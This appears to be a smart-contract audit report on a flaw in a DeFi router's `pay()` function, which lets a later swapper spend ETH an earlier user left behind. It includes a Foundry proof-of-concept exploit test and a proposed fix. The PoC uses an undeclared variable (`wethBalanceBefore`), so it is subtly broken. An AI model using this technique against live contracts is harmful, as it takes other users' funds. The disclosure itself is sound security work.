### Title
Unscoped `address(this).balance` in `pay()` allows any subsequent WETH-swap caller to consume leftover ETH from a prior user — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

The `pay()` function in `PeripheryPayments` uses the contract's **total** native ETH balance (`address(this).balance`) when settling a WETH payment, without verifying that the ETH belongs to the current payer. Any ETH left in the router or liquidity adder from a prior user's `msg.value` that was not refunded is silently consumed to pay for the next user's WETH swap, causing a direct loss of the first user's principal.

---

### Finding Description

`PeripheryPayments.pay()` handles WETH settlement with the following logic:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // ← total contract balance, not caller-scoped
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

`nativeBalance` is the **entire** ETH balance of the contract, not the ETH contributed by the current payer in this transaction. ETH enters the contract exclusively via `msg.value` in payable entry points (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`, `multicall`, `addLiquidityExactShares`, `addLiquidityWeighted`). The `receive()` guard correctly blocks direct ETH sends from non-WETH addresses:

```solidity
receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
}
``` [2](#0-1) 

However, when a user sends more ETH than the swap consumes and does **not** call `refundETH()` in the same multicall, the surplus ETH persists in the contract. The next caller whose swap triggers `pay()` with `token == WETH` will have that surplus applied toward their payment — effectively stealing the first user's ETH.

The `refundETH()` function sends **all** contract ETH to `msg.sender`, not to the original depositor:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
}
``` [3](#0-2) 

This means a third party can also call `refundETH()` directly to drain any stranded ETH.

The same `pay()` function is shared by both `MetricOmmSimpleRouter` (via `_justPayCallback`) and `MetricOmmPoolLiquidityAdder` (via `metricOmmModifyLiquidityCallback`), so both entry points are affected. [4](#0-3) [5](#0-4) 

---

### Impact Explanation

A user who sends excess ETH (e.g., `msg.value = 1 ETH` for a 0.5 ETH WETH swap) without appending a `refundETH()` call loses the surplus to the next WETH-swap caller. The loss is a direct, quantifiable reduction in user principal — not dust. The attacker (next caller) pays nothing for the stolen ETH; they simply call any WETH swap with `msg.value = 0` and the contract's balance covers their obligation.

---

### Likelihood Explanation

The intended usage pattern — multicall with `exactInputSingle` + `refundETH` — is shown in the test suite: [6](#0-5) 

However, users calling swap functions directly (not via multicall), or who omit `refundETH()` from their multicall batch, leave ETH stranded. This is a realistic user-error path, and the loss can be front-run or simply claimed by the next organic WETH swap in the same block.

---

### Recommendation

Track per-call ETH contribution in transient storage (EIP-1153, already used elsewhere in the protocol) and cap `nativeBalance` in `pay()` to only the ETH attributed to the current call:

```solidity
// In pay(), replace:
uint256 nativeBalance = address(this).balance;

// With:
uint256 nativeBalance = _tloadMsgValueBudget(); // transient slot set at entry, cleared after pay()
```

Alternatively, enforce that `msg.value` exactly equals the ETH portion of the swap at the entry-point level, reverting if excess ETH is supplied without a corresponding `refundETH()` in the same multicall.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Setup: pool with WETH/token1, router deployed with WETH address.
// userA and userB are separate EOAs.

function test_ethTheft_via_leftoverBalance() public {
    uint128 swapAmount = 1_000;
    uint256 excessEth = 2 ether; // userA sends 2 ETH but only needs swapAmount

    uint256 userAEthBefore = userA.balance;
    uint256 userBEthBefore = userB.balance;

    // Step 1: userA swaps with excess ETH, forgets refundETH()
    vm.prank(userA);
    bytes[] memory calls = new bytes[](1); // no refundETH call
    calls[0] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: swapAmount,
            amountOutMinimum: 0,
            recipient: userA,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    router.multicall{value: excessEth}(calls);

    // Router now holds (excessEth - swapAmount) of userA's ETH
    assertGt(address(router).balance, 0, "leftover ETH in router");

    // Step 2: userB swaps WETH with msg.value = 0; pay() uses userA's leftover
    vm.prank(userB);
    router.exactInputSingle{value: 0}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: swapAmount,
            amountOutMinimum: 0,
            recipient: userB,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // userB paid 0 ETH and 0 WETH, yet received token1
    assertEq(userB.balance, userBEthBefore, "userB spent no ETH");
    assertEq(weth.balanceOf(userB), wethBalanceBefore, "userB spent no WETH");
    // userA lost (excessEth - swapAmount) ETH beyond their intended swap cost
    assertLt(userA.balance, userAEthBefore - swapAmount, "userA lost excess ETH");
}
```
